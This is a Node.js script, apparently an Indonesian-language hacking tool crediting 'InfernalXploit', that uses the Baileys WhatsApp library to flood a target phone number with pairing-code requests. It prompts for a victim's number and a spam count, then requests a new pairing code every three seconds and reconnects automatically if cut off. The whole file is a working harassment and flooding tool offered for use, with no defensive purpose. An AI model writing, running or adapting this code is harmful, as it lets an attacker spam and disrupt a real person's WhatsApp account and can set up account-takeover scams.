import colors from "colors";
import readline from "readline";
import { makeWASocket, DisconnectReason, useMultiFileAuthState } from "baileys";
import { Boom } from "@hapi/boom";
import Pino from "pino";

// Clear screen
process.stdout.write('\x1Bc');

// Banner warna solid (toska, merah, putih)
console.log(colors.cyan(`
 █████╗ ███╗   ██╗███████╗██████╗ ███████╗███╗   ██╗ █████╗ ██╗     ██╗██████╗ 
██╔══██╗████╗  ██║██╔════╝██╔══██╗██╔════╝████╗  ██║██╔══██╗██║     ██║██╔══██╗
███████║██╔██╗ ██║█████╗  ██████╔╝█████╗  ██╔██╗ ██║███████║██║     ██║██████╔╝
██╔══██║██║╚██╗██║██╔══╝  ██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══██║██║     ██║██╔═══╝ 
██║  ██║██║ ╚████║███████╗██║     ███████╗██║ ╚████║██║  ██║███████╗██║██║     
╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝     
`));

// Informasi tambahan tentang author, pembuat, dan developer
console.log(colors.green("\n[INFO] Author: InfernalXploit"));
console.log(colors.green("[INFO] Pembuat: DarkTr4ce"));
console.log(colors.green("[INFO] Developer: InfernalXploit"));
console.log(colors.green("[INFO] Versi: 1.0.0"));
console.log(colors.green("[INFO] Program dimulai..."));

// Prompt input
function promptInput(question) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });
  return new Promise(resolve => rl.question(colors.white(question), answer => {
    rl.close();
    resolve(answer);
  }));
}

let inputNumber;
let jumlahSpam;

async function start() {
  try {
    const auth = await useMultiFileAuthState("session");
    const client = makeWASocket({
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      auth: auth.state,
      logger: Pino({ level: "fatal" })
    });

    setTimeout(async function () {
      let count = 0;
      const interval = setInterval(async () => {
        if (count >= jumlahSpam) {
          clearInterval(interval);
          return;
        }

        try {
          const code = await client.requestPairingCode(inputNumber);
          console.log(
            colors.red(`[${count + 1}/${jumlahSpam}]`),
            colors.green("Kode pairing:"),
            colors.white(code)
          );
        } catch (err) {
          console.log(colors.red("[Gagal mengambil pairing code]"), err?.message);
        }

        count++;
      }, 3000); // tiap 3 detik
    }, 3000);

    client.ev.on("creds.update", auth.saveCreds);
    client.ev.on("connection.update", async (update) => {
      const { lastDisconnect, connection } = update;
      if (connection === "close") {
        const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
        console.log(colors.red("Disconnected. Reason:"), reason);
        await start();
      }
    });
  } catch (e) {
    console.log(colors.red("Error saat start():"), e);
  }
}

(async () => {
  inputNumber = await promptInput("Masukkan nomor target (cth: 628xxxx): ");
  jumlahSpam = parseInt(await promptInput("Masukkan jumlah spam pairing: "));

  if (!inputNumber || isNaN(jumlahSpam) || jumlahSpam < 1) {
    console.log(colors.red("Input tidak valid. Keluar..."));
    process.exit(1);
  }

  start();
})();